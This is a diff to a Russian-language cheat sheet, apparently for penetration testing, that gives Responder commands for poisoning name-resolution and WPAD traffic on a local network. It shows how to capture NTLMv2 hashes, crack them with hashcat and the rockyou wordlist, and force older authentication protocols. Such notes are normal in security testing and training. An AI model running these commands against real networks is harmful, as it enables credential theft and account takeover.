@@ -10,6 +10,7 @@
 ```Python
 responder -A -I eth0
 ```
+`-A` - анализ. 
 Перехватив NTLMv2 хеш, положим их в файл `tickets.txt` и попробуем восстановить пароли аккаунтов, отправивших нам хеши:  
 `hashcat -a 0 -w 4 -m 5600 tickets.txt /usr/share/wordlists/rockyou.txt`
 
@@ -27,3 +28,11 @@ responder -b -I eth0
 responder -f -I eth0
 ```
 
+# Атака на WPAD
+
+``` 
+responder -I eth0 -wFv
+```
+`-w` - атака на **WPAD**.
+`-F` - по возможности принуждать систему использовать старые протоколы аутентификации.
+`-v` - просматривать аутентификационные данные NTLM хэша.
